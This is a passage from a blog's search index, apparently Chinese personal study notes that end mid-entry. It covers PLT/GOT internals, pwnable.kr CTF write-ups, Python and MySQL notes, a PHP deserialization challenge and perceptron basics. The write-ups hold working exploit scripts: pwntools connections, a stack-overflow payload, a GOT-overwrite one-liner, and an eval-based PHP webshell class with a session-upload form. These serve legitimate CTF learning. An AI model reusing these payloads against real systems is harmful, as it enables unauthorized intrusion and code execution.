<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[python note1]]></title>
    <url>%2F2019%2F07%2F30%2Fpython-note1%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[聊聊plt与got]]></title>
    <url>%2F2019%2F07%2F24%2F%E8%81%8A%E8%81%8Aplt%E4%B8%8Egot%2F</url>
    <content type="text"><![CDATA[深入理解plt和got先写一段代码： 123456789// Build with: gcc -m32 --no-pie -g -o plt plt.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) &#123; puts("Hello world!"); exit(0);&#125; 途中遇到了一个报错：1234In file included from /usr/include/stdio.h:27:0, from plt.c:3:/usr/include/features.h:374:25: fatal error: sys/cdefs.h: No such file or directory # include &lt;sys/cdefs.h&gt; 然后安装一个:apt install libc6-dev-i386 编译好程序之后 1234567$ checksec plt [*] &apos;/home/pxy/pwnable/plt&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 程序是没有pie的 readelf -S plt查看节表 12345[Nr] Name Type Addr Off Size ES Flg Lk Inf Al[12] .plt PROGBITS 08048300 000300 000050 04 AX 0 0 16[13] .text PROGBITS 08048350 000350 000192 00 AX 0 0 16[22] .got PROGBITS 08049ffc 000ffc 000004 04 WA 0 0 4[23] .got.plt PROGBITS 0804a000 001000 00001c 04 WA 0 0 4 可以看到： .plt 基地址为： 0x08048300 .got 基地址为： 0x08049ffc .got.plt 基地址为： 0x0x804a000 我们从调用puts函数那里开始单步执行 首先跳转到plt表中120x804845d &lt;main+16&gt; call puts@plt &lt;0x8048310&gt;0x8048310 &lt;puts@plt&gt; jmp dword ptr [puts@got.plt] &lt;0x804a00c&gt; call puts之后，下一条指令也是一个跳转 jmp dword ptr [puts@got.plt] &lt;0x804a00c&gt;这条指令的意思是取出puts@got.plt表中的值，放到pc寄存器中 所以？查看一下此处内存的值： 12pwndbg&gt; x/2x 0x804a00c0x804a00c &lt;puts@got.plt&gt;: 0x08048316 0x08048326 所以下一条指令的地址就是0x08048316还是在plt表中 12► 0x8048316 &lt;puts@plt+6&gt; push 0 0x804831b &lt;puts@plt+11&gt; jmp 0x8048300 这里先将0放到栈上，表明是要解析puts函数的地址，然后再跳转到0x8048300也就是plt表的开始部分 12► 0x8048300 push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; 0x8048306 jmp dword ptr [0x804a008] &lt;0xf7ff0650&gt; 这时候先把.got.plt表中的第二项放到栈上先查看一下.got.plt中前三项的内容: 12pwndbg&gt; x/3x 0x804a0000x804a000: 0x08049f14 0xf7ffd938 0xf7ff0650 将0xf7ffd938放置到栈上，然后跳转到.got.plt中的第三项，也就是0xf7ff0650，这个地址就是_dl_runtime_resolve函数的地址负责解析函数的地址 此时我们的got表内容如下： 12345678pwndbg&gt; gotGOT protection: Partial RELRO | GOT functions: 4[0x804a00c] puts -&gt; 0x8048316 (puts@plt+6) ◂— push 0 /* &apos;h&apos; */[0x804a010] __gmon_start__ -&gt; 0x8048326 (__gmon_start__@plt+6) ◂— push 8[0x804a014] exit -&gt; 0x8048336 (exit@plt+6) ◂— push 0x10[0x804a018] __libc_start_main -&gt; 0xf7e26a00 (__libc_start_main) ◂— push ebp puts函数的地址还没有重定位 当我们执行过一遍puts函数之后这时候回过头来继续查看got表中的内容： 12345678pwndbg&gt; gotGOT protection: Partial RELRO | GOT functions: 4[0x804a00c] puts -&gt; 0xf7e727e0 (puts) ◂— push ebp[0x804a010] __gmon_start__ -&gt; 0x8048326 (__gmon_start__@plt+6) ◂— push 8[0x804a014] exit -&gt; 0x8048336 (exit@plt+6) ◂— push 0x10[0x804a018] __libc_start_main -&gt; 0xf7e26a00 (__libc_start_main) ◂— push ebp 可以看到地址已经重定位好了 这和Windows的PE文件格式似乎有点不同了，PE文件是装载进内存之后函数地址都已经重定位好了，而Linux的elf文件刚刚装进内存之后函数的地址还是不确定的，需要在运行的时候进行重定位。 当我们将代码修改为如下时： 1234567891011pwndbg&gt; l 1, 20// Build with: gcc -m32 -no-pie -g -o plt plt.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) &#123; puts("Hello world!"); puts("hello world again !!!"); exit(0);&#125; 第一次调用puts函数之后：[0x804a00c] puts -&gt; 0xf7e727e0 (puts) ◂— push ebp puts函数地址已经重定位好了 接下来再次调用puts函数 123456► 0x8048310 &lt;puts@plt&gt; jmp dword ptr [0x804a00c] &lt;0xf7e727e0&gt; ↓ 0xf7e727e0 &lt;puts&gt; push ebp 0xf7e727e1 &lt;puts+1&gt; push edi 0xf7e727e2 &lt;puts+2&gt; push esi 0xf7e727e3 &lt;puts+3&gt; push ebx 此时可以看到直接就跳到函数的地址了因为此时的.got.plt已经是puts函数的地址了， Linux tql 整理一下之前看参考资料中博主的文章一直没有很理解，这里直接统一说一下我的理解： 何谓PLT与GOT其实这里准确的来说应该叫got.plt而不是叫got，不过为了方便我们还是叫它got表吧 要注意那个jmp *printf@got *号是取出地址处的值，并不是跳到got表中去 延迟重定位这篇文章我觉得写的很精彩 Linux为了缩减代码,就是按照这种模式来的： 12345678910void printf@plt()&#123;address_good: jmp *printf@got // 链接器将printf@got填成下一语句lookup_printf的地址lookup_printf: 调用重定位函数查找printf地址，并写到printf@got goto address_good;&#125; 也就和上面那张图是一一对应的 公共got表项在解析函数的真正地址时， _dl_runtime_resolve是怎么知道它要解析哪个函数的 因为： 1234printf@plt&gt;: jmp *0x80496f8 push $0x00 jmp common@plt 这里push的值不一样，相当于就是每个函数取了一个id 之后就是公共got表的内容： got[0]: 本ELF动态段(.dynamic段）的装载地址 got[1]：本ELF的link_map数据结构描述符地址 got[2]：_dl_runtime_resolve函数的地址 穿针引线 PLT表中的第一项为公共表项，剩下的是每个动态库函数为一项（当然每项是由多条指令组成的，jmp *0xXXXXXXXX这条指令是所有plt的开始指令）每项PLT都从对应的GOT表项中读取目标函数地址 GOT表中前3个为特殊项，分别用于保存 .dynamic段地址、本镜像的link_map数据结构地址和_dl_runtime_resolve函数地址；但在编译时，无法获取知道link_map地址和_dl_runtime_resolve函数地址，所以编译时填零地址，进程启动时由动态链接器进行填充 参考聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT聊聊Linux动态链接中的PLT和GOT（２）——延迟重定位聊聊Linux动态链接中的PLT和GOT（３）——公共GOT表项聊聊Linux动态链接中的PLT和GOT（4）—— 穿针引线GOT and PLT for pwning.]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable]]></title>
    <url>%2F2019%2F07%2F24%2Fpwnable%2F</url>
    <content type="text"><![CDATA[pwnable从小白开始pwnable是一个适合小白的网站 https://pwnable.kr/play.php fd有源码： 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf("pass argv[1] a number\n"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp("LETMEWIN\n", buf))&#123; printf("good job :)\n"); system("/bin/cat flag"); exit(0); &#125; printf("learn about Linux file IO\n"); return 0;&#125; 这道题目是让你了解Linux下的文件描述符12345fd@prowl:~$ ./fd 4660LETMEWINgood job :)mommy! I think I know what a file descriptor is!!fd@prowl:~$ collision12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf("usage : %s [passcode]\n", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf("passcode length should be 20 bytes\n"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system("/bin/cat flag"); return 0; &#125; else printf("wrong passcode.\n"); return 0;&#125; 果然我还是小白，连最基本的常识都不懂了，意识到了是由输入的argv[1]来计算的，20个字节正好分成5次，就是把每四个加起来就行了。 所以可以直接拿0x21DD09EC去除掉5就好了exp如下：1234567from pwn import *pwn_ssh=ssh(host='pwnable.kr',user='col',password='guest',port=2222)print(pwn_ssh.connected())sh=pwn_ssh.process(argv=['collision','\xc9\xce\xc5\x06'*4+'\xc8\xce\xc5\x06'],executable='./col')print(sh.recvall()) 这里还学到了一波用pwnssh连接的。 bof源码：123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf("overflow me : "); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system("/bin/sh"); &#125; else&#123; printf("Nah..\n"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; 这是一个简单的栈溢出的题目虽然简单，但是小白还是要仔细地分析一下的。 func对应的汇编代码，其实感觉汇编代码看的更明白一些：12345678910111213141516171819202122.text:565D262C func proc near ; CODE XREF: main+10p.text:565D262C.text:565D262C s = byte ptr -2Ch.text:565D262C var_C = dword ptr -0Ch.text:565D262C arg_0 = dword ptr 8.text:565D262C.text:565D262C push ebp.text:565D262D mov ebp, esp.text:565D262F sub esp, 48h.text:565D2632 mov eax, large gs:14h ;gs保护机制.text:565D2638 mov [ebp+var_C], eax.text:565D263B xor eax, eax.text:565D263D mov dword ptr [esp], offset s ; &quot;overflow me : &quot;.text:565D2644 call near ptr puts+565D2649h.text:565D2649 lea eax, [ebp+s].text:565D264C mov [esp], eax ; s.text:565D264F call near ptr gets+565D2654h.text:565D2654 cmp [ebp+arg_0], 0CAFEBABEh.text:565D265B jnz short loc_565D266B.text:565D265D mov dword ptr [esp], offset command ; &quot;/bin/sh&quot;.text:565D2664 call near ptr system+565D2669h.text:565D2669 jmp short loc_565D2677 之前一直不太明白如果局部变量是数组该怎么搞 关键是这里：12.text:565D2649 lea eax, [ebp+s].text:565D264C mov [esp], eax ; s 注意lea eax, [ebp+s]这里加了方括号但是其实还是地址，就是将字符串s的地址赋值给eax然后再将其存放到栈顶，之后调用gets函数，将输入的值填入到缓冲区 从这张图就能明白内存的分布了这道题目保护机制基本都开了，但是我们并不需要执行代码。只需要覆盖栈上的值就行了。也不会触发gs保护机制 exp如下： 12345678from pwn import *payload = 'A'*52+'\xbe\xba\xfe\xca'r=remote('pwnable.kr',9000)print(r.connected())r.sendline(payload)r.interactive() 运行效果如下： 12345678910111213pxy@ubuntu:~/pwnable$ python bofexp.py[+] Opening connection to pwnable.kr on port 9000: DoneTrue[*] Switching to interactive mode$ lsbofbof.cflagloglog2super.pl$ cat flagdaddy, I just pwned a buFFer :) flag这道题目被upx加壳，Linux下的加壳倒还是第一次遇到。 到这里可以找到脱壳的工具 脱壳之后gdb载入，查看反汇编代码 1234567891011121314151617181920pwndbg&gt; disassemble mainDump of assembler code for function main: 0x0000000000401164 &lt;+0&gt;: push rbp 0x0000000000401165 &lt;+1&gt;: mov rbp,rsp 0x0000000000401168 &lt;+4&gt;: sub rsp,0x10 0x000000000040116c &lt;+8&gt;: mov edi,0x496658 0x0000000000401171 &lt;+13&gt;: call 0x402080 &lt;puts&gt; 0x0000000000401176 &lt;+18&gt;: mov edi,0x64 0x000000000040117b &lt;+23&gt;: call 0x4099d0 &lt;malloc&gt; 0x0000000000401180 &lt;+28&gt;: mov QWORD PTR [rbp-0x8],rax 0x0000000000401184 &lt;+32&gt;: mov rdx,QWORD PTR [rip+0x2c0ee5] # 0x6c2070 &lt;flag&gt; 0x000000000040118b &lt;+39&gt;: mov rax,QWORD PTR [rbp-0x8] 0x000000000040118f &lt;+43&gt;: mov rsi,rdx 0x0000000000401192 &lt;+46&gt;: mov rdi,rax 0x0000000000401195 &lt;+49&gt;: call 0x400320 0x000000000040119a &lt;+54&gt;: mov eax,0x0 0x000000000040119f &lt;+59&gt;: leave 0x00000000004011a0 &lt;+60&gt;: ret End of assembler dump.pwndbg&gt; b *0x0000000000401184 然后在此处下断点 123456789RAX 0x6c96b0 ◂— 0x0RBX 0x401ae0 (__libc_csu_fini) ◂— push rbxRCX 0x8RDX 0x496628 ◂— push rbp /* &apos;UPX...? sounds like a delivery service :)&apos; */RDI 0x4RSI 0x0R8 0x1R9 0x3R10 0x22 命中断点之后单步一次就行这时候就看到寄存器的变化 flag就是那个拉2333 paascode学到了一点从远程服务器下载东西的命令 $ scp -P 2222 passcode@pwnable.kr:/home/passcode/passcode . 源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344$ cat passcode.c #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf("enter passcode1 : "); scanf("%d", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf("enter passcode2 : "); scanf("%d", passcode2); printf("checking...\n"); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123; printf("Login OK!\n"); system("/bin/cat flag"); &#125; else&#123; printf("Login Failed!\n"); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf("enter you name : "); scanf("%100s", name); printf("Welcome %s!\n", name);&#125;int main()&#123; printf("Toddler's Secure Login System 1.0 beta.\n"); welcome(); login(); // something after login... printf("Now I can safely trust you that you have credential :)\n"); return 0;&#125; 作为一名小白还是要好好地分析栈帧的构造 那要怎么分析程序呢？最关键的还是分析程序的交互过程，毕竟我们也是从程序的输入入手的。 12345 0x804862a &lt;welcome+33&gt; mov eax, 0x80487dd 0x804862f &lt;welcome+38&gt; lea edx, [ebp - 0x70]► 0x8048632 &lt;welcome+41&gt; mov dword ptr [esp + 4], edx 0x8048636 &lt;welcome+45&gt; mov dword ptr [esp], eax 0x8048639 &lt;welcome+48&gt; call __isoc99_scanf@plt &lt;0x80484a0&gt; 此处是调用scanf函数的过程， 先将一个地址0x80487dd赋值给eax寄存器，之后将ebp-0x70的地址传给edx寄存器，注意到这里的操作符是lea之后再将edx寄存器的值放到栈的第二层，最后将eax寄存器的值放到栈顶。 所以调用scanf函数的时候，栈顶是0x80487dd，往下加4个字节存储的是一个局部变量开始的位置(就是字符串s的首地址) 123456 0x804862f &lt;welcome+38&gt; lea edx, [ebp - 0x70] 0x8048632 &lt;welcome+41&gt; mov dword ptr [esp + 4], edx 0x8048636 &lt;welcome+45&gt; mov dword ptr [esp], eax► 0x8048639 &lt;welcome+48&gt; call __isoc99_scanf@plt &lt;0x80484a0&gt; format: 0x80487dd ◂— &apos;%100s&apos; vararg: 0xff8e7068 ◂— 0x28 /* &apos;(&apos; */ 这是参数的传递过程此时栈上的布局： 1200:0000│ esp 0xff8e7050 —▸ 0x80487dd ◂— and eax, 0x73303031 /* &apos;%100s&apos; */01:0004│ 0xff8e7054 —▸ 0xff8e7068 ◂— 0x28 /* &apos;(&apos; */ 这里有一点疑惑 直接查看内存 12pwndbg&gt; x/20x 0x80487dd0x80487dd: 0x30303125 0x30303125 其实就是%100的小端表示！！ 但是换一种方式看 123pwndbg&gt; x/20i 0x80487dd 0x80487dd: and eax,0x73303031 0x80487e2: add BYTE PTR [edi+0x65],dl 到底是数据还是指令全看程序员了 123456passcode@prowl:~$ python -c &quot;print &apos;A&apos;*96+&apos;\x04\xa0\x04\x08&apos;+str(0x080485d7)&quot; | ./passcodeToddler&apos;s Secure Login System 1.0 beta.enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!enter passcode1 : Login OK!Sorry mom.. I got confused about scanf usage :(Now I can safely trust you that you have credential :) 不过这道题目我没有搞得很清楚]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>wp</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python文档阅读笔记1]]></title>
    <url>%2F2019%2F07%2F24%2Fpython%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01%2F</url>
    <content type="text"><![CDATA[python 官方文档阅读python可视化编程网站 循环循环的问题list类型是可变序列 12345words = ['cat', 'window', 'defenestrate']for w in words[:]: if len(w) &gt; 6: words.insert(0, w)print(words) 如果将上述代码的循环语句改为：for w in words:那么这个循环就变成了死循环原因是words这个list会被修改 同样的可以看这个： 12345basket = ['apple', 'orange', 'pear', 'orange', 'banana']for f in sorted(basket): print(f)print(basket) 在经过sorted函数之后，basket已经被修改了 可以看这个： 同样的list还有这样一个问题： 代码如下：1234567def f(a, L=[]): L.append(a) return Lprint(f(1))print(f(2))print(f(3)) 修改成这样就行： 12345def f(a, L = None): if L is None: L = [] L.append(a) return L 循环的tricksdict循环 123knights = &#123;'gallahad':'the pure', 'robin':'the brave'&#125;for key, value in knights.items(): print(key, value) list循环 12for index, value in enumerate(['tac', 'tic', 'toe']): print("index = &#123;&#125;, value = &#123;&#125;".format(index, value)) 两个list循环 12345questions = ['name', 'quest', 'favorite color']answers = ['lancelot', 'the holy grail', 'blue']for q,a in zip(questions, answers): print("what is your &#123;&#125;? It is &#123;&#125;".format(q, a)) 逆向循环 123# 逆向循环序列时，先正向，再调用reverse()函数for i in reversed(range(1, 10, 2)): print(i) 指定顺序循环，用sorted函数 参数的传递之前还一直没明白python中**param这种传递形式的用法这个栗子就很棒啦 123456789101112def cheeseshop(kind, *arguments, **keywords): print("-- Do you have any", kind, "?") print("-- I'm sorry, we're all out of", kind) for arg in arguments: print(arg) print("-" * 40) for kw in keywords: print(kw, ":", keywords[kw])cheeseshop("Limburger", "It's very runny, sir.", "It's really very, VERY runny, sir.",shopkeeper="Michael Palin", client="John Cleese", sketch="Cheese Shop Sketch") 结果如下： 12345678-- Do you have any Limburger ?-- I&apos;m sorry, we&apos;re all out of LimburgerIt&apos;s very runny, sir.It&apos;s really very, VERY runny, sir.----------------------------------------shopkeeper : Michael Palinsketch : Cheese Shop Sketchclient : John Cleese 第一个kind参数就是第一个字符串，之后arguments相当于一个接收了一个list，keywords接收了一个dict 解包参数列表比如这个栗子： 12args = [3,6]list(range(*args)) 输出的结果就是[3,4,5] 也就是说我们可以通过*运算符来对一个list进行解包并将其作为参数传递 匿名函数lambda12pairs = [(1, 'one'), (2, 'two'), (3, 'three'), (4, 'four')]pairs.sort(key=lambda pair:pair[1]) sort方法有两个参数，一个是指定待排序的关键字，一个是reversed，其中key用一个匿名函数进行指定，有一点函数式编程的味道]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[探寻数据库]]></title>
    <url>%2F2019%2F07%2F22%2F%E6%8E%A2%E5%AF%BB%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[mysql命令行操作小结感觉这些知识又快忘记了 登陆 mysql -u root -p 创建数据库 create database databasename 删除数据库 drop database databasename 从外部sql文件导入，如果sql文件中没有创建数据库需要先指定一个数据库然后source path/*.sql就可以导入了，再也不用受烦人的phpmyadmin影响了 删除数据表drop table table_name 导出表mysqldump -u root -p RUNOOB runoob_tbl &gt; dump.txt 导出数据库mysqldump -u root -p RUNOOB &gt; database_dump.txt 备份所有数据库mysqldump -u root -p --all-databases &gt; database_dump.txt 一般sql文件的写法： 123456789drop database if exists DBName;creat database DBName;use DBName;#开始创建表create ......#开始插入数据insert.... 使用pymysql连接数据库1234567891011import pymsqlcon = pymysql.connect('localhost', 'root', '', 'mpsa')try: with con.cursor() as cursor: sql = 'drop database runoob' cursor.execute(sql) con.commit()finally: con.close() 那个cursor函数我也不是很明白为什么，不过一般的用法就是这样啦 php连接数据库使用php连接数据库,创建数据库，然后删除 123456789101112131415$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(!$conn)&#123; die("error!!");&#125;echo "连接成功";//查询数据$sql = "create database runoob";$retval = mysqli_query($conn, $sql);if(!$retval)&#123; die("查询数据失败！");&#125;echo "创建成功";$sql1 = "drop database runoob";$retval = mysqli_query($conn, $sql);mysqli_close($conn); 遇到了问题： 查了一下stackoverflow看到了这个回答： The mysqli-&gt;connect_error property only works properly as of PHP versions 5.2.9 and 5.3.0. Use the mysqli_connect_error() function if compatibility with earlier PHP versions is required. 12345678910111213141516171819$mysqli = new mysqli('localhost', 'my_user', 'my_password', 'my_db');/* * This is the "official" OO way to do it, * BUT $connect_error was broken until PHP 5.2.9 and 5.3.0. */if ($mysqli-&gt;connect_error) &#123; die('Connect Error (' . $mysqli-&gt;connect_errno . ') ' . $mysqli-&gt;connect_error);&#125;/* * Use this instead of $connect_error if you need to ensure * compatibility with PHP versions prior to 5.2.9 and 5.3.0. */if (mysqli_connect_error()) &#123; die('Connect Error (' . mysqli_connect_errno() . ') ' . mysqli_connect_error());&#125; 原来是建立过程中的不稳定，怪不得我新建的数据库没有被删掉. 参考stackoverflow的回答pymysql文档，写的很简单]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php-challenge9]]></title>
    <url>%2F2019%2F07%2F22%2Fphp-challenge9%2F</url>
    <content type="text"><![CDATA[php-challenge 9第一次接触到这个题目，被惊呆了 12345678910111213141516171819202122232425&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; 初看源代码觉得并没有哪里可以让我反序列化注入的地方但是问题就出在第一句话：ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); 关键点在于，如果脚本中设置的序列化处理器与php.ini设置的不同，或者两个脚本注册session使用的序列化处理器不同，那么就会出现安全问题。 只需要加一个|就行 这道jarvisOj题目就是这个原题这里还用到了另外一个漏洞： 自己构造一个网页如下： 12345&lt;form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"&gt; &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /&gt; &lt;input type="file" name="file" /&gt; &lt;input type="submit" /&gt;&lt;/form&gt; 然后在上传一个文件，本地抓包，这里遇到了一点小问题，就是没办法抓到本地的包，可以通过直接对局域网的网络连接进行设置即可. 此时就可以看到了 接下来继续利用 tql。。。有趣的php反序列化总结szfszfjarvisoj-web-writeup]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[deep learning1]]></title>
    <url>%2F2019%2F07%2F21%2Fdeep-learning1%2F</url>
    <content type="text"><![CDATA[感知机补充接着写 感知机的训练中，老师还提供了一部份资料，比如训练出$y=2x$ 我们简要地看一下一次训练的结果： bias x y w0 w1 yout y-yout adj0 adj1 alpha w0new w1new 1 0.512 1.023 0.719 0.403 0.926 0.977 0.977 0.500 0.7 0.788 0.438 进行很多次训练之后画出的图形： 预测的还是挺准确的 为什么需要bias？概念上很好理解，bias就是将一个正比例函数变为了一次函数，这样不必每次都过原点，分类的准确性也就大大地提高了 多层感知机一层的感知机是没办法处理异或问题的 所以需要增加隐藏层就像下面这样：这样就可以做到了： 感觉MLP的数学知识太过复杂了，暂时放着 keras从栗子代码开始：12345678910111213141516171819202122from keras.models import Sequentialmodel = Sequential()from keras.layers import Dense'''使用add来堆叠模型'''model.add(Dense(units=64, activation='relu', input_dim=100))model.add(Dense(units=10, activation='softmax'))'''使用compile来配置学习过程'''model.compile(loss='categorical_crossentropy', optimizer='sgd', metrics=['accuracy'])# x_train 和 y_train 是 Numpy 数组 -- 就像在 Scikit-Learn API 中一样。model.fit(x_train, y_train, epochs=5, batch_size=32)'''评估模型'''loss_and_metrics = model.evaluate(x_test, y_test, batch_size=128)classes = model.predict(x_test, batch_size=128) Sequentialcompile在训练模型之前，需要配置学习过程，compile接收三个参数 优化器optimizer 损失函数loss 评估标准metrics 一个个来看 优化器可以先实例化一个优化器对象，然后将它传入model.compile()，或者可以通过 损失函数 损失函数（或称目标函数、优化评分函数）是编译模型时所需的两个参数之一：1model.compile(loss='mean_squared_error', optimizer='sgd') 我们可以传递一个现有的损失函数名，或者一个tensorflow符号函数，有以下两个参数 y_true: 真实标签. y_pred: 预测值,其shape与y_true相同 可用的损失函数：mean_squared_errormean_absolute_error等 参考神经网络中w,b参数的作用（为何需要偏置b的解释）深度学习中偏移项bias的作用]]></content>
      <categories>
        <category>deep learning</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[deep learning0]]></title>
    <url>%2F2019%2F07%2F21%2Fdeep-learning0%2F</url>
    <content type="text"><![CDATA[deep learning整理一下上课的笔记，不然全都会忘了去 无监督学习self organizing map 简称SOM算法 大意：给定一个向量$v_{k}$,寻找到距离最近的神经元 找到最接近的神经元 n_{bmu}=\underset{1\leqslant i\leqslant m}{argmin}\left \| v_{k}-n_{i} \right \| 更新$n_{i}$ wikipedia上一张很形象的图片: 蓝色斑点是训练数据的分布，小白色光盘是从该分布中抽取的当前训练数据。首先（左），SOM节点任意地位于数据空间中。选择最接近训练基准的节点（以黄色突出显示）。它被移向训练数据，因为（在较小程度上）是它在网格上的邻居。在多次迭代之后，网格倾向于近似数据分布（右）。 有监督学习数学知识特征向量线性代数中的特征向量： 对于一个给定的方阵A，它的特征向量v经过线性变化之后，得到的新向量仍然与原来的v保持在同一条直线上，但其长度或方向也许会改变，即： Av=\lambda v此时$v$就是矩阵$A$的特征向量，$\lambda$就是对应的特征值 进一步：在一定条件下，一个变换可以由其特征值特征向量完全表述，也就是说，所有的特征向量组成了这向量空间的一组基底。一个特征空间是具有相同特征值的特征向量与一个同维数的零向量的集合，比如$E_{\lambda }=\left \{ u\in V | Au=\lambda u\right \}$即为线性变化$A$中以$\lambda$为特征值的特征空间 抽象概念不容易理解，举几个栗子： 恒等变换$I$的特征向量I(v)=v=1\cdot v可以看到所有的特征向量都是恒等变换$I$的特征向量，恒等变换的特征空间只有一个就是整个空间 类似的，数乘变换$\lambda I$的特征向量也是所有的非零向量，因为按照定义：\lambda I(v) = \lambda \cdot v 感知器看张图： 数学表述为：$t = f(\sum _{i=1}^{n} w_{i}x_{i} + b) = f(\mathbf{w}^{T} \mathbf{x})$ f函数的表达式： f(x) = \left\{\begin{matrix} 1 & if \, w \cdot x + b > 0 \\ 0 & else \end{matrix}\right.$\mathbf{x} = \left [ x_{1}\, x_{2} … \, x_{n} \, 1 \right]^{T}$, $\mathbf{w} = \left [ w_{1}\, w_{2} \, …w_{n} \, b \right]^{T}$ 如何训练？ 我们来看一个训练与运算的demo123456789101112131415161718192021222324252627282930313233343536373839404142434445import numpy as npdef load_data(): ''' 加载数据，input_data和labels对应 ''' input_data = [[1, 1], [0, 0], [1, 0], [0, 1]] labels = [1, 0, 0, 0] return input_data, labelsdef train_pre(input_data, y, iteration, rate): ''' 训练，更新w和b ''' unit_step = lambda x: 0 if x &lt; 0 else 1 w = np.random.rand(len(input_data[0])) bias = 0.0 for i in range(iteration): samples = zip(input_data, y) for (input_i, label) in samples: result = input_i * w + bias result = float(sum(result)) y_pred = float(unit_step(result)) w = w + rate * (label - y_pred) * np.array(input_i) bias = rate * (label - y_pred) return w, biasdef predict(input_i, w, b): ''' 预测 ''' unit_step = lambda x: 0 if x &lt; 0 else 1 result = input_i * w + b result = sum(result) y_pred = float(unit_step(result)) print(y_pred)if __name__ == "__main__": input_data, y = load_data() w, b = train_pre(input_data, y, 20, 0.01) predict([1, 1], w, b) 我们很惊讶地发现一个如此简单地模型竟然不可思议地完成了这个任务。数据更新：$w(j) := w(j) + \alpha (y-f(x))x(j) (j = 1,…n)$ 异或问题当时老师上课时候提到异或问题是不可解的，后来查了一下资料才明白在神经网络发展的早期，异或问题确实是不可解的，不过通过加入隐藏层使得异或问题能够有了新的解法 如下图： 复习的时候才注意到原来老师提到了通过加入隐藏层的方式来解决异或问题 参考资料【机器学习】神经网络实现异或（XOR）1.5 图形化理解神经网络中的异或问题感知器 wikipedia]]></content>
      <categories>
        <category>deep learning</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[从Googlectf一道题认识一下链接文件]]></title>
    <url>%2F2019%2F07%2F21%2F%E4%BB%8EGooglectf%E4%B8%80%E9%81%93%E9%A2%98%E8%AE%A4%E8%AF%86%E4%B8%80%E4%B8%8B%E9%93%BE%E6%8E%A5%E6%96%87%E4%BB%B6%2F</url>
